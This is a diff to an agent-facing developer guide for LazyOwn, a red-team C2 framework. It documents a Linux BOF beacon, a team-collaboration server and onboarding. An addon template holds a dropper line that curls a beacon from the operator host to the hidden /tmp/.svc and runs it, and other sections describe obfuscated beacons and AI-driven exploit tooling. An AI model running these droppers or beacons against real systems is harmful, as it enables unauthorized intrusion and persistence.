@@ -17,9 +17,9 @@ LazyOwn is a professional **red team / penetration testing framework**. It bundl
 
 - A **cmd2-based interactive CLI** (`lazyown.py`) with 333+ attack commands and
   200+ aliases covering the full kill chain.
-- A **Flask + Jinja2 + Socket.IO C2 server** (`lazyc2.py`) with 84 routes, 54
-  templates, malleable HTTP profiles, an XOR-stub Go beacon, and a phishing
-  module backed by SQLite + Groq AI.
+- A **Flask + Jinja2 + Socket.IO C2 server** (`lazyc2.py`) with 84+ routes, 55+
+  templates, malleable HTTP profiles, an XOR-stub Go beacon, a multi-operator
+  collaboration layer (`/collab/`), and a phishing module backed by SQLite + Groq AI.
 - A shared **utility layer** (`utils.py`) with ~138 helpers: payload loading, ANSI
   output, prompt rendering, key/cert generation, NVD/ExploitAlert/PacketStorm
   scrapers, ARP spoofing primitives, etc.
@@ -29,6 +29,9 @@ LazyOwn is a professional **red team / penetration testing framework**. It bundl
 - An **extension layer**: `lazyaddons/*.yaml` (declarative tool integration),
   `plugins/*.lua` (Lua scripting via lupa), and `tools/*.tool` (pwntomate
   service-triggered jobs).
+- A **Linux BOF beacon family** (`lazyaddons/blacksandbeacon.yaml` +
+  `lazyaddons/blacksandbeacon_bof.yaml`) — the only open-source C2 with
+  Linux Beacon Object File support via ELF `dlopen` injection.
 
 The **MCP layer sits on top of everything** and exposes ~95 `lazyown_*` tools to
 Claude Code. The CLI uses **cmd2**. The C2 uses **Flask** with **Jinja2**.
@@ -94,6 +97,7 @@ change that affects `skills/lazyown_mcp.py` or modules imported at startup.
 | `tools/` | pwntomate `.tool` files auto-applied to nmap-discovered services. |
 | `external/` | Vendored upstreams (atomic-red-team, etc.). |
 | `lazyscripts/` | `.ls` scripts — small recipes loaded with `run_script`. |
+| `QUICKSTART.md` | Canonical 5-minute onboarding guide (clone → wizard → recon → C2 → beacon → collab). **Do not auto-generate**; update manually when the operator flow changes. |
 
 ---
 
@@ -257,6 +261,11 @@ implementation of the CLI.
   and a JSON dashboard at `/api/dashboard`.
 - Blueprints registered at runtime: `phishing_bp`, `dashboard_bp` (under
   `/dashboard`), `collab_bp` (under `/collab`).
+- Before registering `collab_bp`, `lazyc2.py` injects
+  `app.config["LAZYOWN_CONFIG"] = config` so the blueprint can read `lhost` and
+  `c2_port` via `current_app.config.get("LAZYOWN_CONFIG")` without importing
+  `utils.py` directly. This is the approved pattern for blueprints that need
+  payload values — do not pass them as module-level globals.
 - Auth: HTTP Basic via `requires_auth` (uses `c2_user` / `c2_pass`) plus
   `flask-login` for the operator UI.
 - DNS server: `dnslib`-based custom resolver started in a daemon thread.
@@ -397,6 +406,8 @@ Conventions (consumers depend on these exact names):
 | `policy_facts.json` | policy engine | dashboard |
 | `captured_images/` | decoy site | operator review |
 | `keyword_fallback_index.json` | rag fallback when ChromaDB absent | rag_query |
+| `blacksandbeacon` | `blacksandbeacon` addon (`make`) | collab_join delivery, manual drop on target |
+| `bof_loader` | `blacksandbeacon_bof` addon (`make bof`) | manual BOF delivery to live beacon session |
 
 Before any tool runs:
 1. `ls sessions/` to see what already exists.
@@ -586,6 +597,10 @@ lazyown_hive_spawn(goal="…", n_drones=4, roles=["recon","exploit","cred","late
 lazyown_generate_report(target="10.10.11.5", include_timeline=True)
 lazyown_report_update(action="auto_fill")
 lazyown_misp_export()
+
+# Multi-operator collaboration (CLI)
+collab_join <handle>           # print team dashboard URL + SSE endpoint
+collab_join alice --curl       # also print curl SSE command
 ```
 
 ---
@@ -705,8 +720,157 @@ Requires `pip install textual` (added to `install.sh` and `requirements`).
 
 ---
 
+## 15c. Beacon family — Linux BOF (`blacksandbeacon`)
+
+LazyOwn ships two beacon lines. Pick the right one for the engagement:
+
+| Beacon | File | OS | BOF | Notes |
+|--------|------|----|-----|-------|
+| Go beacon | built-in (`do_lazymsfvenom`, `lazyc2`) | Win/Lin/Mac | No | XOR-encoded two-stage; AES-256 C2 channel; Garble-obfuscated |
+| Windows C beacon | `lazyaddons/beacon.yaml` | Windows | Yes (Early Bird APC) | Pairs with malleable C2 profile; NT Native API |
+| **Linux C beacon** | **`lazyaddons/blacksandbeacon.yaml`** | **Linux** | **Yes (ELF dlopen)** | **Only open-source Linux BOF; direct syscalls** |
+| Linux BOF loader | `lazyaddons/blacksandbeacon_bof.yaml` | Linux | — | Delivers compiled `.so` BOF to a live beacon session |
+| ARM beacon | `blackzincbeacon` (external) | ARM/IoT | Planned | Embedded targets |
+
+### Linux BOF contract
+
+- BOFs compile as position-independent ELF shared objects:
+  `gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c`
+- The `datap` API (`BeaconDataParse`, `BeaconDataInt`, `BeaconDataExtract`,
+  `BeaconPrintf`, `BeaconOutput`) is source-compatible with Windows BOF — port
+  by replacing Win32 calls with Linux syscalls or libc equivalents.
+- The beacon loads BOFs at runtime via `dlopen`; no new process, no disk write
+  after delivery.
+
+### Addon YAML pattern (for both beacons)
+
+```yaml
+install_command: make
+execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
+lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
+```
+
+Key rules:
+- Always `git restore . ; git pull` before `make` so the binary is fresh.
+- Stage artefacts to `sessions/<binary>` — the C2 serves them from there.
+- `lazycommand` uses `{lhost}` and `{lport}` placeholders — never hardcode.
+- `download_file` names the path on the target side (for reference in docs only).
+
+### Tests
+
+`tests/test_blacksandbeacon_addon.py` — 59 tests covering: YAML structure,
+required fields, tool section keys, path safety (no `../` traversal), category,
+params contract, `{lhost}`/`{lport}` template placeholders, `sessions/` staging,
+`git restore + pull` before build, description quality, no hardcoded IPs/ports.
+
+---
+
+## 15d. Multi-operator collaboration — `collab_bp`
+
+`modules/collab_bp.py` is a Flask blueprint providing real-time team server
+functionality. It activates automatically when `lazyc2.py` starts.
+
+### Architecture (SOLID)
+
+| Class | Responsibility |
+|-------|---------------|
+| `EventBus` | In-process SSE pub/sub; per-subscriber `Queue`; replays last 20 events on join |
+| `LockManager` | Advisory per-target locks with TTL expiry; prevents two operators running tools against the same host |
+| `OperatorRegistry` | Tracks connected operators; marks stale (> 90 s without heartbeat) as inactive |
+| `ColabEvent` | Value object: `type`, `payload`, `operator`, `ts`, `id` |
+
+Module-level singletons (`_bus`, `_locks`, `_registry`) are injected into the
+blueprint via closure. Other modules broadcast events with:
+```python
+from collab_bp import publish_event
+publish_event(type="finding", payload={"target": "...", "detail": "..."}, operator="alice")
+```
+
+### Endpoints
+
+| Endpoint | Method | Description |
+|---|---|---|
+| `/collab/` | GET | Full-screen browser dashboard (`templates/collab.html`) |
+| `/collab/stream?operator=<name>` | GET (SSE) | Real-time event stream; keepalive every 15 s |
+| `/collab/operators` | GET | Active operator list + join timestamps |
+| `/collab/publish` | POST | Broadcast a structured event (type, payload, operator) |
+| `/collab/lock` | POST | Acquire advisory target lock (body: target, operator, ttl_secs) |
+| `/collab/unlock` | POST | Release target lock |
+| `/collab/locks` | GET | All active locks with operator and TTL |
+| `/collab/history?n=N` | GET | Last N events (max 500) |
+
+### `templates/collab.html`
+
+Extends `base.html`. Renders: operator presence panel, target lock UI (acquire /
+release), real-time event feed (SSE), chat broadcast input, and a copyable join
+URL. Reads `c2_host` and `join_url` from the Flask context injected by the UI
+route. No hardcoded IPs — all values come from `payload.json` via
+`app.config["LAZYOWN_CONFIG"]`.
+
+### `LAZYOWN_CONFIG` injection pattern
+
+`lazyc2.py` sets `app.config["LAZYOWN_CONFIG"] = config` immediately before
+`app.register_blueprint(collab_bp, ...)`. The blueprint reads it with:
+```python
+cfg = current_app.config.get("LAZYOWN_CONFIG", {})
+lhost = cfg.get("lhost", "localhost") if hasattr(cfg, "get") else getattr(cfg, "lhost", "localhost")
+```
+The `hasattr` guard handles both plain `dict` (tests) and `Config` objects
+(production). **This is the canonical pattern for blueprints that need payload
+values.** Do not pass `config` as a module-level import from `lazyc2.py`.
+
+### `do_collab_join` CLI command
+
+Added to `lazyown.py`, category `10. Command & Control`. Usage:
+```
+collab_join [handle] [--curl]
+```
+Reads `lhost` and `c2_port` from `self.params` and prints the team dashboard
+URL, SSE stream URL, and all REST endpoints. `--curl` adds a ready-to-paste
+`curl --insecure -N` command for terminal SSE consumption.
+
+### Tests
+
+`tests/test_collab_and_onboarding.py` — 67 tests covering: `EventBus`
+(publish/subscribe, history replay, queue overflow), `LockManager` (acquire,
+deny, re-acquire, TTL expiry, release), `OperatorRegistry` (join, leave,
+heartbeat, stale expiry), all 8 Flask HTTP endpoints, `collab.html` template
+content, `QUICKSTART.md` completeness, wizard DIP contract, and `collab_join`
+CLI command structure.
+
+---
+
+## 15e. Onboarding — `QUICKSTART.md` + `wizard`
+
+### `QUICKSTART.md`
+
+Canonical operator onboarding document. **Manually maintained** — update it
+whenever the operator flow changes (new step required, command renamed, etc.).
+Structure:
+1. Prerequisites (OS, Python, SecLists)
+2. Clone + `bash install.sh`
+3. `wizard` — 7-step guided setup (rhost, lhost, domain, device, os_id, api_key, wordlists)
+4. Recon (`ping` → `lazynmap` → `auto_populate` → `facts_show`)
+5. C2 (`fast_run_as_r00t.sh` or `lazyc2`)
+6. First shell (Go beacon or `blacksandbeacon` Linux C beacon)
+7. Invite teammates (`collab_join`)
+8. Command reference table + key files table + troubleshooting
+
+### `cli/wizard.py` contract
+
+The wizard must **never** import `lazyown.py` or `lazyc2.py` (Dependency
+Inversion). It takes a `params: dict` and a `save: Callable` — it never
+touches `payload.json` directly. All output goes through `rich`. Auto-detects
+`lhost` from the routing table and SecLists paths from known candidate dirs.
+
+Run from the CLI: `wizard` or `wizard --check` (readiness summary only).
+The shell calls `wizard` automatically on first launch when `rhost` is unset.
+
+---
+
 ## 16. Read these next
 
+- `QUICKSTART.md` — **start here for a new operator session** — 5-minute clone-to-shell guide.
 - `README.md` — public-facing feature list (long, marketing-flavoured).
 - `COMMANDS.md` — exhaustive list of every CLI command.
 - `UTILS.md` — auto-generated reference for `utils.py`.
